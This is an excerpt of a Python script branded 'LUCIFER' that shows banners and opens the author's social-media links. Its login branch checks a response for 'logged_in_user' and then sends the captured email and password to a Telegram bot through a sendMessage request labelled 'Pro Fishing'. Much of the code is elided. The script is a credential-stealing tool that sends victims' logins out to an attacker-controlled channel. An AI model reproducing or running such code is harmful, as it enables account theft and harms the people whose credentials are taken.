...
try:
    ...
    try:
        ...
        P55 = pyfiglet.figlet_format('☆☆LUCIFER☆☆')
        print( C + P55)
        sleep(2)
        os.system('clear')
        ...
        print(  G + P55)
        sleep(6)
        webbrowser.open('https://youtu.be/gwHaVlOd4Jw')
        os.system('clear')
        P55 = pyfiglet.figlet_format('========>')
        print(  B + P55)
        sleep(18)
...
/_/   \_\_|\___/|___/_| |_|
        ...
        webbrowser.open('https://t.me/BBLBB0')
        ...
        print('\n')
        webbrowser.open('https://vt.tiktok.com/ZSCRA/')
        ...
        if ask == '1':
            while True:
                ...
                if 'logged_in_user' in req_login.text:
                    ...
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi Pro Fishing From LUCIFER‌‌\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :- @BBLBB0 -: @BBLBB0 "
                    i = requests.post(tlg)
